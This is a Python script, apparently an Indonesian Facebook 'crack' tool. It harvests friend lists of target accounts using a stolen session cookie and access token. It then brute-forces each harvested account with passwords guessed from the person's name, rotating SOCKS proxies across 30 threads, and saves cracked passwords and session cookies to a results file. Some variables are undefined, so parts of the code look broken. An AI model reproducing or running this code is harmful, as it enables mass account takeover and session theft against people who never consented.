import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
putihkentals,yamet=[],[]
def clear():
	os.system('clear')
def back():
	login()
def banner():
	clear()
	print("-----------------------------------------------[ CRACK SIMPLE ]-----------------------------------------------")

def login():
	try:
		token = open('data/token.txt','r').read()
		cok = open('data/cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print(f' x Internet Bermasalah')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cookie=input(f' Cookies : ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open("data/token.txt", "w").write(find_token.group(1))
		cok=open("data/cok.txt", "w").write(cookie)
		print(f' ✓ Login berhasil ')
		time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f data/token.txt")
		os.system("rm -f data/cok.txt")
		print(f' x Login Gagal')
		exit()
		
def menu(my_name,my_id):
	try:
		token = open('data/token.txt','r').read()
		cok = open('data/cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("http://ip-api.com/json/").json()["query"]
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	print(f"{ip}")
	print(f"{negara}")
	monggo_dicrack()
	
def monggo_dicrack():
	try:
		token = open('data/token.txt','r').read()
		cok = open('data/cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f' ┌──► Masukan Jumlah Target')
		jum = int(input(f" └──►  "))
	except ValueError:
		print(f' Masukan Angka')
		exit()
	if jum<1 or jum>100:
		print(f' Gagal dump')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		print(f' ┌──► Masukan Id Target')
		kl = input(f" └──► 0{yz} : ")
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('unstable signal ')
			exit()
	try:
		print(f' Total : {len(id)} id')
		gasss_bang()
	except requests.exceptions.ConnectionError:
		print('unstable signal ')
		back()
	except (KeyError,IOError):
		print('Id tidak ditemukan')
		time.sleep(3)
		back()
		
def gasss_bang():
	print("1. akun old")
	print("2. akun new")
	print("3. akun random")
	print(f' ┌──► Pilih Nomor')
	pilihan = input(f' └──►  ')
	if pilihan in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif pilihan in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif pilihan in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('input correctly ')
		exit()
	print("")
	print ("1. mobile")
	print(f' ┌──► Pilih Nomor')
	pilihann = input(f' └──►  ')
	if pilihann in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	putihkental=input(' Tambahkan Password Manual [Y/N] : ')
	if putihkental in ['y','Y']:
		putihkentals.append('ya')
		print(" Contoh Password : sayang, bismillah, Indonesia")
		print(f' ┌──► Pw Tambahan')
		pwku=input(f' └──►  ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			yamet.append(xpw)
	else:
		putihkentals.append('no')
	aduh_ngentod()

def aduh_ngentod():
	print(" Selamat Crack ")
	print(" Hasil Ok/Cp Simpan di [ Crackk/rslt ]")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print(" Crack Selesai ")
	exit()

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r└\x1b[1;90m[%s\x1b[1;93mTEGAR-XY\x1b[1;90m]-[\x1b[1;91m%s\x1b[1;90m/\33[m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\33[93mCP:%s\x1b[93m]\x1b[1;90m-[\x1b[1;94m%s%s\x1b[1;90m]%s ✓'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses = requests.Session()
			nip=random.choice(prox)
			proxy= {'http': 'socks5://'+nip}
			hd1 = {
			    'Host': 'm.facebook.com',
			    'cache-control': 'max-age=0',
			    'user-agent': 'Mozilla/5.0 (Linux; Android 4.2.2; GT-I9505 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36',
			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			    'sec-fetch-site': 'same-origin',
			    'sec-fetch-mode': 'navigate',
			    'sec-fetch-dest': 'document',
			    'referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-pin%2F%3Frefid%3D8&refsrc=deprecated',
			    'upgrade-insecure-requests': '1',
			    'accept-encoding': 'gzip, deflate, br',
			    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			p = ses.get(f'https://m.facebook.com/login/device-based/password/?uid=100088232743381&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-pin%2F%3Frefid%3D8&flow=login_no_pin&refsrc=deprecated&_rdr', headers=hd1)
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(ge.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ge.text)).group(1),"uid":idf,"next":f"https://m.facebook.com/login/device-based/validate-pin/?refid=8","flow":"login_no_pin","pass":pw,}
			hd2 = {
			    'Host': 'm.facebook.com',
			    'cache-control': 'max-age=0',
			    'content-length': '350',
			    'origin': 'https://m.facebook.com',
			    'content-type': 'application/x-www-form-urlencoded',
			    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 AOL/11.0 AOLBUILD/11.0.1567 Safari/537.36',
			    'pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace',
			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			    'sec-ch-ua-mobile': '?0',
			    'sec-ch-ua-platform': '"Linux"',
			    'sec-fetch-site': 'same-origin',
			    'sec-fetch-mode': 'navigate',
			    'sec-fetch-dest': 'document',
			    'sec-fetch-user': '?1',
			    'referer': f'https://m.facebook.com/login/device-based/password/?uid={idf}&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-pin%2F%3Frefid%3D8&flow=login_no_pin&refsrc=deprecated&_rdr',
			    'upgrade-insecure-requests': '1',
			    'accept-encoding': 'gzip, deflate, br',
			    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=hd2,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"{idf} - {pw}")
				open('Crackk/rslt','a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f" {idf} - {pw}")
				print(f" {kuki}")
				open('Crackk/rslt','a').write(idf+'|'+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('Crackk/rslt')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()